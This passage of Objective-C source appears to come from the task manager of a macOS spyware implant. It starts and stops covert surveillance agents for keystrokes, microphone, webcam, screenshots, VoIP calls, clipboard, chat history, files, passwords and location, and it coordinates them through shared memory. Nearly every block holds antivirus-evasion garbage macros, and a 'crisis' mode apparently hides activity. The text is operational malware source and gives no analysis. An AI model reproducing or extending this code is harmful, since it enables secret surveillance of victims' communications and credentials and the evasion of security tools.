            _mouseConfig->commandDataSize = [agentConf length];
            
            // AV evasion: only on release build
            AV_GARBAGE_006
            
            memcpy(_mouseConfig->commandData,
                   [agentConf bytes],
                   [agentConf length]);
            
            // AV evasion: only on release build
            AV_GARBAGE_005
            
            if ([gSharedMemoryLogging writeMemory: mouseConfig
                                           offset: 0
                                    fromComponent: COMP_CORE] == TRUE)
              {
                // AV evasion: only on release build
                AV_GARBAGE_004
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_MOUSE
                                        fromComponent: COMP_CORE] == TRUE)
                  {
                    // AV evasion: only on release build
                    AV_GARBAGE_003
                    
                    [agentConfiguration setObject: AGENT_RUNNING
                                           forKey: @"status"];
                  }
                else
                  {
                    // AV evasion: only on release build
                    AV_GARBAGE_001
                    
                    [agentCommand release];
                    return NO;
                  }
              }
          }
        break;
      }
    case AGENT_CHAT_NEW:
        {
            // AV evasion: only on release build
            AV_GARBAGE_005
        
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
            // AV evasion: only on release build
            AV_GARBAGE_002
        
            if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
                ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
            {
              
                // agent chat as history dump  starts here
                __m_MAgentChat *agentChat = [__m_MAgentChat sharedInstance];
                [agentConfiguration setObject: AGENT_START
                                       forKey: @"status"];
              
                [agentChat setAgentConfiguration: agentConfiguration];
              
                // AV evasion: only on release build
                AV_GARBAGE_003
              
                [NSThread detachNewThreadSelector: @selector(start)
                                         toTarget: agentChat
                                       withObject: nil];
                // agent chat as history dump ends here

                // AV evasion: only on release build
                AV_GARBAGE_002
          
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID   = agentID;
                shMemoryHeader->direction = D_TO_AGENT;
                shMemoryHeader->command   = AG_START;
            
                // AV evasion: only on release build
                AV_GARBAGE_003
            
                BOOL success = [_logManager createLog: AGENT_CHAT_NEW
                                          agentHeader: nil
                                            withLogID: 0];
            
                if (success == TRUE)
                {
                    // AV evasion: only on release build
                    AV_GARBAGE_004
              
                    if ([gSharedMemoryCommand writeMemory: agentCommand
                                                   offset: OFFT_IM
                                            fromComponent: COMP_CORE] == TRUE)
                    {
                        // AV evasion: only on release build
                        AV_GARBAGE_001
                    
                        [agentConfiguration setObject: AGENT_RUNNING
                                               forKey: @"status"];
                    }
                    else
                    {
                        // AV evasion: only on release build
                        AV_GARBAGE_002
                                    
                        [agentCommand release];
                        //[agentConfiguration release];  // for chat as history dump
                        //return NO;                     // for chat as history dump
                    }
                }
            }
        }
        break;
    case AGENT_CLIPBOARD:
      {  
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        // AV evasion: only on release build
        AV_GARBAGE_008
        
        if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
            ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
          {   
            // AV evasion: only on release build
            AV_GARBAGE_004
          
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;

            
            // AV evasion: only on release build
            AV_GARBAGE_001
            
            BOOL success = [_logManager createLog: AGENT_CLIPBOARD
                                      agentHeader: nil
                                        withLogID: 0];
            if (success == TRUE)
              {
                
                // AV evasion: only on release build
                AV_GARBAGE_003
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_CLIPBOARD
                                        fromComponent: COMP_CORE] == TRUE)
                  {
                    [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_008
                    
                  }
                else
                  {  
                    // AV evasion: only on release build
                    AV_GARBAGE_003
                  
                    
                    [agentCommand release];
                    [agentConfiguration release];
                    return NO;
                  }
              }
          }
        break;
      }
    case AGENT_VOIP:
      {  
        // AV evasion: only on release build
        AV_GARBAGE_008
        
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
            ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
          {     
            // AV evasion: only on release build
            AV_GARBAGE_002
          
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID     = AGENT_VOIP;
            shMemoryHeader->direction   = D_TO_AGENT;
            shMemoryHeader->command     = AG_START;
            
            // AV evasion: only on release build
            AV_GARBAGE_006
            
            NSMutableData *voipConfig = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
            NSData *agentConf = [agentConfiguration objectForKey: @"data"];
            
            // AV evasion: only on release build
            AV_GARBAGE_004
            
            voipStruct *voipConfiguration = (voipStruct *)[agentConf bytes];
            gSkypeQuality                 = voipConfiguration->compression;
            
            // AV evasion: only on release build
            AV_GARBAGE_003
            
            shMemoryLog *_voipConfig     = (shMemoryLog *)[voipConfig bytes];
            _voipConfig->status          = SHMEM_WRITTEN;
            _voipConfig->agentID         = AGENT_VOIP;
            _voipConfig->direction       = D_TO_AGENT;
            _voipConfig->commandType     = CM_AGENT_CONF;
            _voipConfig->commandDataSize = [agentConf length];
            
            // AV evasion: only on release build
            AV_GARBAGE_002
            
            memcpy(_voipConfig->commandData,
                   [agentConf bytes],
                   [agentConf length]);
            
            // AV evasion: only on release build
            AV_GARBAGE_008
            
            if ([gSharedMemoryLogging writeMemory: voipConfig
                                           offset: 0
                                    fromComponent: COMP_CORE] == TRUE)
              {  
                // AV evasion: only on release build
                AV_GARBAGE_001
              
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_VOIP
                                        fromComponent: COMP_CORE] == TRUE)
                  {
                    // AV evasion: only on release build
                    AV_GARBAGE_002
                    
                    [agentConfiguration setObject: AGENT_RUNNING
                                           forKey: @"status"];
                  }
                else
                  {
                    // AV evasion: only on release build
                    AV_GARBAGE_001
                    
                    [agentCommand release];
                    [agentConfiguration release];
                    [voipConfig release];
                    return NO;
                  }
              }
            
            [voipConfig release];
          }
        
        break;
      }
    case AGENT_POSITION:
        {
            // AV evasion: only on release build
            AV_GARBAGE_003
        
            __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
            agentConfiguration = [[self getConfigForAgent: agentID] retain];

            if (agentConfiguration != nil)
            {
                // AV evasion: only on release build
                AV_GARBAGE_002
          
                if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
                && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
                {
                    // AV evasion: only on release build
                    AV_GARBAGE_000
              
                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
                    [agentPosition setAgentConfiguration: agentConfiguration];
                
                    // AV evasion: only on release build
                    AV_GARBAGE_001
                
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentPosition
                                           withObject: nil];
                }
                else
                {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Agent Position is already running");
#endif
                }
            }
            else
            {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Agent not found");
#endif
                return FALSE;
            }
        }
        break;
    case AGENT_DEVICE:
        {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Starting Agent Device");
#endif

            // AV evasion: only on release build
            AV_GARBAGE_001
        
            __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
            agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
            // AV evasion: only on release build
            AV_GARBAGE_002
        
            if (agentConfiguration != nil)
            {
                if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
                && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
                {
                    // AV evasion: only on release build
                    AV_GARBAGE_008
              
                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
                    [agentDevice setAgentConfiguration: agentConfiguration];
                
                    // AV evasion: only on release build
                    AV_GARBAGE_004
                
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentDevice
                                           withObject: nil];
                }
                else
                {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Agent Device is already running");
#endif
                }
            }
            else
            {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Agent not found");
#endif
                return FALSE;
            }
        }
        break;
    case AGENT_MICROPHONE:
        {
            // AV evasion: only on release build
            AV_GARBAGE_001
        
            __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
            agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
            // AV evasion: only on release build
            AV_GARBAGE_002
        
            if (agentConfiguration != nil)
            {
                // AV evasion: only on release build
                AV_GARBAGE_001
            
                if (![[agentConfiguration objectForKey: @"status"] isEqual: AGENT_RUNNING]
                && ![[agentConfiguration objectForKey: @"status"] isEqual: AGENT_START])
                {
                    // AV evasion: only on release build
                    AV_GARBAGE_009
              
                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
                    [agentMic setAgentConfiguration: agentConfiguration];
                
                    // AV evasion: only on release build
                    AV_GARBAGE_002
                
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentMic
                                           withObject: nil];
                }
                else
                {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Agent Microphone is already running");
#endif
                }
            }
            else
            {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Agent microphone not found");
#endif
                return FALSE;
            }
        }
        break;
    case AGENT_FILECAPTURE:
      {  
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
            ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
        {
            // AV evasion: only on release build
            AV_GARBAGE_002
          
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = AGENT_INTERNAL_FILECAPTURE;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
            
            // AV evasion: only on release build
            AV_GARBAGE_006
            
            BOOL success = [_logManager createLog: AGENT_FILECAPTURE_OPEN
                                      agentHeader: nil
                                        withLogID: 0];

            if (success)
            {
                // AV evasion: only on release build
                AV_GARBAGE_003
              
                NSMutableData *fileConfig = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
                NSData *agentConf         = [agentConfiguration objectForKey: @"data"];
                
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                shMemoryLog *_fileConfig     = (shMemoryLog *)[fileConfig bytes];
                _fileConfig->status          = SHMEM_WRITTEN;
                _fileConfig->agentID         = AGENT_INTERNAL_FILECAPTURE;
                _fileConfig->direction       = D_TO_AGENT;
                _fileConfig->commandType     = CM_AGENT_CONF;
                _fileConfig->commandDataSize = [agentConf length];
                
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                memcpy(_fileConfig->commandData,
                       [agentConf bytes],
                       [agentConf length]);

                if ([gSharedMemoryLogging writeMemory: fileConfig
                                               offset: 0
                                        fromComponent: COMP_CORE] == TRUE)
                {
                    // AV evasion: only on release build
                    AV_GARBAGE_004                    

                    if ([gSharedMemoryCommand writeMemory: agentCommand
                                                   offset: OFFT_FILECAPTURE
                                            fromComponent: COMP_CORE] == TRUE)
                      {
                        // AV evasion: only on release build
                        AV_GARBAGE_001
                        
                        [agentConfiguration setObject: AGENT_RUNNING
                                               forKey: @"status"];
                      }
                    else
                      {
                        // AV evasion: only on release build
                        AV_GARBAGE_003
                        
                        [agentCommand release];
                        [agentConfiguration release];
                        [fileConfig release];
                        [outerPool release];
                        return NO;
                      }
                  }
                
                // AV evasion: only on release build
                AV_GARBAGE_005
                
                [fileConfig release];
              }
            else
              {
#ifdef DEBUG_TASK_MANAGER
                errorLog(@"Error while initializing empty log for file capture");
#endif
              }
          }
        
        break;
      }
    case AGENT_CRISIS:
      {
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        gAgentCrisis |= CRISIS_START;

        
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
        [infoManager logActionWithDescription: @"Crisis started"];
        [infoManager release];
        
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        // Only for input manager
        if ([gUtil isLeopard])
          {  
            // AV evasion: only on release build
            AV_GARBAGE_007
          
            if (gAgentCrisisApp == nil)
              break;

            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            agentConfiguration = [[self getConfigForAgent: agentID] retain];
            
            // AV evasion: only on release build
            AV_GARBAGE_001
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];

            shMemoryHeader->agentID = agentID;          
            shMemoryHeader->direction = D_TO_AGENT;
            shMemoryHeader->command = AG_START;
            
            // AV evasion: only on release build
            AV_GARBAGE_003
            
            memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
            
            // AV evasion: only on release build
            AV_GARBAGE_001
            
            NSMutableData *tmpArray = [[NSMutableData alloc] initWithCapacity: 0];
            UInt32 tmpNum = [gAgentCrisisApp count];
            [tmpArray appendBytes: &tmpNum length: sizeof(UInt32)];
            
            // AV evasion: only on release build
            AV_GARBAGE_004
            
            int tmpLen = sizeof(shMemoryHeader->commandData);
            
            // AV evasion: only on release build
            AV_GARBAGE_001
            
            unichar padZero=0;
            NSData *tmpPadData = [[NSData alloc] initWithBytes: &padZero length:sizeof(unichar)];
            
            // AV evasion: only on release build
            AV_GARBAGE_006
            
            for (int i=0; i < [gAgentCrisisApp count]; i++)
              {
                NSString *tmpString = (NSString*)[gAgentCrisisApp objectAtIndex: i];
                
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                tmpLen -= [tmpString lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] + sizeof(unichar);

                if (tmpLen > 0)
                  {
                    [tmpArray appendData: [tmpString dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
                    [tmpArray appendData: tmpPadData];
                  }
              }

            [tmpPadData release];
            
            // AV evasion: only on release build
            AV_GARBAGE_002
            
            shMemoryHeader->commandDataSize = [tmpArray length];
            memcpy(shMemoryHeader->commandData, [tmpArray bytes], shMemoryHeader->commandDataSize);

            if ([gSharedMemoryCommand writeMemory: agentCommand
                                           offset: OFFT_CRISIS
                                    fromComponent: COMP_CORE] == TRUE)
              {
                [agentConfiguration setObject: AGENT_RUNNING
                                       forKey: @"status"];
                
                // AV evasion: only on release build
                AV_GARBAGE_008
                
              }
            else
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"An error occurred while starting agent CRISIS");
#endif
                [tmpArray release];
                [agentCommand release];
                [agentConfiguration release];
                return NO;
              }

            [tmpArray release];
          }
        break;
      }
    default:
      {
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        [outerPool release];
        return NO;
      }
    }

  if (agentCommand != nil)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_001
    
      [agentCommand release];
    }
  if (agentConfiguration != nil)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_001
    
      [agentConfiguration release];
    }
  
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return YES;
}

- (BOOL)stopAgent: (u_int)agentID
{
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  __m_MLogManager *_logManager = [__m_MLogManager sharedInstance];
  NSMutableDictionary *agentConfiguration;
  NSData *agentCommand;

  // AV evasion: only on release build
  AV_GARBAGE_001  
  
  switch (agentID)
  {
      case AGENT_MONEY:
      {
          // AV evasion: only on release build
          AV_GARBAGE_009
          
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Stopping Agent Money");
#endif
          __m_MAgentMoney *agentMoney = [__m_MAgentMoney sharedInstance];
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          if ([agentMoney stop] == FALSE)
          {
#ifdef DEBUG_TASK_MANAGER
              errorLog(@"Error while stopping agent Money");
#endif
              return NO;
          }
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          agentConfiguration = [self getConfigForAgent: agentID];
          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          
          // AV evasion: only on release build
          AV_GARBAGE_006
          
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Money stopped correctly");
#endif

      }
        break;
      case AGENT_PASSWORD:
      {
   
          // AV evasion: only on release build
          AV_GARBAGE_009
          
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Stopping Agent Password");
#endif
          __m_MAgentPassword *agentPassword = [__m_MAgentPassword sharedInstance];
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          if ([agentPassword stop] == FALSE)
          {
#ifdef DEBUG_TASK_MANAGER
              errorLog(@"Error while stopping agent Password");
#endif
              return NO;
          }
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          agentConfiguration = [self getConfigForAgent: agentID];
          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          
          // AV evasion: only on release build
          AV_GARBAGE_006
          
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Password stopped correctly");
#endif

      }
      break;
      case AGENT_MESSAGES:
      {
          // AV evasion: only on release build
          AV_GARBAGE_009
          
#ifdef DEBUG_TASK_MANAGER
          warnLog(@"Stopping Agent Messages");
#endif
          __m_MAgentMessages *agentMessages = [__m_MAgentMessages sharedInstance];
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          if ([agentMessages stop] == FALSE)
          {
#ifdef DEBUG_TASK_MANAGER
              errorLog(@"Error while stopping agent Messages");
#endif
              return NO;
          }
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          agentConfiguration = [self getConfigForAgent: agentID];
          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          
          // AV evasion: only on release build
          AV_GARBAGE_006
          
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Messages stopped correctly");
#endif
          
      }
      break;
          
    case AGENT_SCREENSHOT:
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
      
      if ([agentScreenshot stop] == FALSE)
      {
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        return NO;
      }
      
      agentConfiguration = [self getConfigForAgent: agentID];
      [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
      
      break;
    }
    case AGENT_ORGANIZER:
    {  
      // AV evasion: only on release build
      AV_GARBAGE_009
      
#ifdef DEBUG_TASK_MANAGER        
      warnLog(@"Stopping Agent Organizer");
#endif
      __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      if ([agentOrganizer stop] == FALSE)
      {
#ifdef DEBUG_TASK_MANAGER
        errorLog(@"Error while stopping agent Organizer");
#endif
        return NO;
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      agentConfiguration = [self getConfigForAgent: agentID];
      [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
#ifdef DEBUG_TASK_MANAGER
      infoLog(@"Organizer stopped correctly");
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      break;
    }
    case AGENT_CAM:
    {
#ifdef DEBUG_TASK_MANAGER        
      infoLog(@"Stopping Agent WebCam");
#endif  
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      if ([agentWebcam stop] == FALSE)
      {
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"Error while stopping agent Webcam");
#endif      
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        return NO;
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      agentConfiguration = [self getConfigForAgent: agentID];
      [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
      
      break;
    }
    case AGENT_KEYLOG:
    {      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
      shMemoryHeader->agentID         = agentID;
      shMemoryHeader->direction       = D_TO_AGENT;
      shMemoryHeader->command         = AG_STOP;
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      if ([gSharedMemoryCommand writeMemory: agentCommand
                                     offset: OFFT_KEYLOG
                              fromComponent: COMP_CORE] == TRUE)
      {       
        // AV evasion: only on release build
        AV_GARBAGE_005
                
        agentConfiguration = [self getConfigForAgent: agentID];
        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
        
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        [_logManager closeActiveLog: AGENT_KEYLOG
                          withLogID: 0];
      }
      else
      {
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"Error while sending Stop command to Agent Keylog");
#endif
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        return NO;
      }      
      break;
    }
    case AGENT_VOIP:
    {      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
      
      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
      shMemoryHeader->agentID         = agentID;
      shMemoryHeader->direction       = D_TO_AGENT;
      shMemoryHeader->command         = AG_STOP;
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      if ([gSharedMemoryCommand writeMemory: agentCommand
                                     offset: OFFT_VOIP
                              fromComponent: COMP_CORE] == TRUE)
      {
        // AV evasion: only on release build
        AV_GARBAGE_005
                
        agentConfiguration = [self getConfigForAgent: agentID];
        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
      }
      else
      {       
        // AV evasion: only on release build
        AV_GARBAGE_002
        
        return NO;
      }
      break;
    }
    case AGENT_URL:
    {      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
      shMemoryHeader->agentID         = agentID;
      shMemoryHeader->direction       = D_TO_AGENT;
      shMemoryHeader->command         = AG_STOP;
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      if ([gSharedMemoryCommand writeMemory: agentCommand
                                     offset: OFFT_URL
                              fromComponent: COMP_CORE] == TRUE)
      {
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        
        agentConfiguration = [self getConfigForAgent: agentID];
        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
        
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        [_logManager closeActiveLog: AGENT_URL
                          withLogID: 0];
        
        // AV evasion: only on release build
        AV_GARBAGE_003
      }
      else
      {
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"Error while sending Stop command to Agent URL");
#endif
        
        return NO;
      }
      
      break;
    }
    case AGENT_APPLICATION:
    {
      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
      shMemoryHeader->agentID         = agentID;
      shMemoryHeader->direction       = D_TO_AGENT;
      shMemoryHeader->command         = AG_STOP;
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      if ([gSharedMemoryCommand writeMemory: agentCommand
                                     offset: OFFT_APPLICATION
                              fromComponent: COMP_CORE] == TRUE)
      {
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        agentConfiguration = [self getConfigForAgent: agentID];
        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
        
        // AV evasion: only on release build
        AV_GARBAGE_002
        
        [_logManager closeActiveLog: AGENT_APPLICATION
                          withLogID: 0];
      }
      else
      {
        // AV evasion: only on release build
        AV_GARBAGE_005      
        
        return NO;
      }
      break;
    }
    case AGENT_MOUSE:
    {
      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
      shMemoryHeader->agentID         = agentID;
      shMemoryHeader->direction       = D_TO_AGENT;
      shMemoryHeader->command         = AG_STOP;
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      if ([gSharedMemoryCommand writeMemory: agentCommand
                                     offset: OFFT_MOUSE
                              fromComponent: COMP_CORE] == TRUE)
      {
        // AV evasion: only on release build
        AV_GARBAGE_000
               
        agentConfiguration = [self getConfigForAgent: agentID];
        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
      }
      else
      {
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        return NO;
      }
      break;
    }
    case AGENT_CHAT_NEW:
      {
          // AV evasion: only on release build
          AV_GARBAGE_001
      
          // agent chat as history dump starts here
          __m_MAgentChat *agentChat = [__m_MAgentChat sharedInstance];
          if ([agentChat stop] == FALSE)
          {
#ifdef DEBUG_TASK_MANAGER
              errorLog(@"Error while stopping agent chat history dump");
#endif
          }
          // agent chat as history dump stops here
        
          agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
      
          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
          shMemoryHeader->agentID         = agentID;
          shMemoryHeader->direction       = D_TO_AGENT;
          shMemoryHeader->command         = AG_STOP;
      
          // AV evasion: only on release build
          AV_GARBAGE_002
      
          if ([gSharedMemoryCommand writeMemory: agentCommand
                                         offset: OFFT_IM
                                  fromComponent: COMP_CORE] == TRUE)
          {
              // AV evasion: only on release build
              AV_GARBAGE_000
        
              agentConfiguration = [self getConfigForAgent: agentID];
              [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
        
              // AV evasion: only on release build
              AV_GARBAGE_004
        
              [_logManager closeActiveLog: AGENT_CHAT_NEW
                                withLogID: 0];
          }
          else
          {
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"Error while sending Stop command to agent CHAT");
#endif
        
              //return NO;
          }
          break;
      }
    case AGENT_CLIPBOARD:
    {
      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
      shMemoryHeader->agentID         = agentID;
      shMemoryHeader->direction       = D_TO_AGENT;
      shMemoryHeader->command         = AG_STOP;
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      if ([gSharedMemoryCommand writeMemory: agentCommand
                                     offset: OFFT_CLIPBOARD
                              fromComponent: COMP_CORE] == TRUE)
      {
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        agentConfiguration = [self getConfigForAgent: agentID];
        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
        
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        [_logManager closeActiveLog: AGENT_CLIPBOARD
                          withLogID: 0];
      }
      else
      {        
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        return NO;
      }
      break;
    }
    case AGENT_POSITION:
    {      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
      
      if ([agentPosition stop] == FALSE)
      {
        // AV evasion: only on release build
        AV_GARBAGE_006
    
        return NO;
      }
      break;
    }
    case AGENT_MICROPHONE:
    {
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
      
      if ([agentMic stop] == FALSE)
      {
        // AV evasion: only on release build
        AV_GARBAGE_002
    
        return NO;
      }
      
      agentConfiguration = [self getConfigForAgent: agentID];
      [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
      
      break;
    }
    case AGENT_DEVICE:
    {
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"Starting Agent Device");
#endif

      // AV evasion: only on release build
      AV_GARBAGE_000
      
      __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
      
      if ([agentDevice stop] == FALSE)
      {
        // AV evasion: only on release build
        AV_GARBAGE_009
        
        return NO;
      }
      else
      {      
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        agentConfiguration = [self getConfigForAgent: agentID];
        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
      }
      break;
    }
    case AGENT_CRISIS:
    {     
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      gAgentCrisis &= ~(CRISIS_STARTSTOP);
      
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
      [infoManager logActionWithDescription: @"Crisis stopped"];
      [infoManager release];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      // Only for input manager
      if ([gUtil isLeopard])
      {      
        // AV evasion: only on release build
        AV_GARBAGE_006
        
